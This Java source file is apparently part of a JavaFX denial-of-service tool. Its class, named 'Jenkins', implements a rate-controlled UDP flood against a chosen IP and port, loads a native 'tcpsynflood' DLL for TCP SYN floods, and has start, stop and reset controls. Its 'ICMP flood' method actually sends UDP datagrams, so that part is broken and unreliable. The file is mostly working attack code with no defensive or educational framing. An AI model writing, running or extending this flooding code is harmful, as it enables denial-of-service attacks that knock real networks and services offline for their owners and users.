package com.yourpackage;

import java.net.DatagramSocket;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.util.logging.Logger;
import java.net.Socket;
import java.io.OutputStream;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.io.File;
import java.util.concurrent.ThreadLocalRandom;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Enumeration;

public class Jenkins {
    private static final byte[] DEFAULT_PAYLOAD = new byte[1300]; // 1300 bytes payload
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private TextArea logArea;

    // Constructor
    public Jenkins() {
        // Initialize any required resources
    }

    // Method to set the log area
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // UDP Flood method
    public void udpFlood(String targetIp, int targetPort, int bytesPerSecond) {
        log("Starting UDP flood attack on " + targetIp + ":" + targetPort + " at " + bytesPerSecond + " bytes/second");

        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[1300]; // Adjust packet size if needed
            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, targetPort);

            long startTime = System.currentTimeMillis();
            long bytesSent = 0;
            int packetsSent = 0;

            while (!stopAttack) {
                socket.send(packet);
                bytesSent += buffer.length;
                packetsSent++;

                if (packetsSent % 1000 == 0) { // Log every 1000 packets
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                    log(String.format("Sent %d packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                }

                // Add rate limiting if necessary
                if (bytesSent >= bytesPerSecond) {
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    if (elapsedTime < 1000) {
                        Thread.sleep(1000 - elapsedTime);
                    }
                    startTime = System.currentTimeMillis();
                    bytesSent = 0;
                }
            }
        } catch (Exception e) {
            log("Error in UDP flood: " + e.getMessage());
        }
        log("UDP flood attack stopped");
    }

    // TCP SYN Flood method
    public native boolean tcpSynFlood(String targetIp, int targetPort, int bytesPerSecond);

    static {
        System.out.println("Working Directory: " + System.getProperty("user.dir"));
        try {
            String libraryPath = System.getProperty("java.library.path");
            System.out.println("Java Library Path: " + libraryPath);
            File nativeDir = new File(libraryPath);
            System.out.println("Native directory exists: " + nativeDir.exists());
            if (nativeDir.exists() && nativeDir.isDirectory()) {
                String[] contents = nativeDir.list();
                System.out.println("Native directory contents: " + (contents != null ? String.join(", ", contents) : "empty"));
                File dllFile = new File(nativeDir, "tcpsynflood.dll");
                System.out.println("DLL file exists: " + dllFile.exists());
                System.out.println("DLL file path: " + dllFile.getAbsolutePath());
                if (dllFile.exists()) {
                    System.loadLibrary("tcpsynflood");
                    System.out.println("tcpsynflood library loaded successfully");
                } else {
                    throw new UnsatisfiedLinkError("tcpsynflood.dll not found in " + nativeDir.getAbsolutePath());
                }
            } else {
                throw new UnsatisfiedLinkError("Native directory does not exist or is not a directory: " + nativeDir.getAbsolutePath());
            }
        } catch (UnsatisfiedLinkError e) {
            System.err.println("Failed to load tcpsynflood library: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // ICMP Flood method
    public void icmpFlood(String targetIp, int bytesPerSecond) {
        log("Starting ICMP flood attack on " + targetIp + " at " + bytesPerSecond + " bytes/second");
        stopAttack = false;

        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[64]; // ICMP header (8 bytes) + 56 bytes of data
            buffer[0] = 8; // ICMP Echo Request type

            long startTime = System.currentTimeMillis();
            long bytesSent = 0;
            int packetsSent = 0;

            while (!stopAttack) {
                try (DatagramSocket socket = new DatagramSocket()) {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);
                    socket.send(packet);
                    bytesSent += buffer.length;
                    packetsSent++;

                    if (packetsSent % 1000 == 0) {
                        long elapsedTime = System.currentTimeMillis() - startTime;
                        double actualMbps = (bytesSent * 8.0 / (1024 * 1024)) / (elapsedTime / 1000.0);
                        log(String.format("Sent %d ICMP packets, %.2f MB, %.2f Mbps", packetsSent, bytesSent / (1024.0 * 1024), actualMbps));
                    }

                    // Rate limiting
                    if (bytesSent >= bytesPerSecond) {
                        long elapsedTime = System.currentTimeMillis() - startTime;
                        if (elapsedTime < 1000) {
                            Thread.sleep(1000 - elapsedTime);
                        }
                        startTime = System.currentTimeMillis();
                        bytesSent = 0;
                    }
                }
            }
        } catch (Exception e) {
            log("Error in ICMP flood: " + e.getMessage());
        }
        log("ICMP flood attack stopped");
    }

    // Method to stop the attack
    public void stopAttack() {
        stopAttack = true;
        log("Stop attack flag set to true");
    }

    // Method to reset the attack
    public void resetAttack() {
        stopAttack = false;
        log("Attack state reset");
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + " - " + message + "\n");
            });
        }
    }

    public String getMacAddress(String targetIp) {
        try {
            InetAddress address = InetAddress.getByName(targetIp);
            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(address);
            if (networkInterface == null) {
                log("Network interface for the specified IP address is not available.");
                return null;
            }
            byte[] mac = networkInterface.getHardwareAddress();
            if (mac == null) {
                log("MAC address could not be retrieved.");
                return null;
            }
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < mac.length; i++) {
                sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
            }
            String macAddress = sb.toString();
            log("MAC address retrieved: " + macAddress);
            return macAddress;
        } catch (Exception e) {
            log("Error retrieving MAC address: " + e.getMessage());
            return null;
        }
    }
}
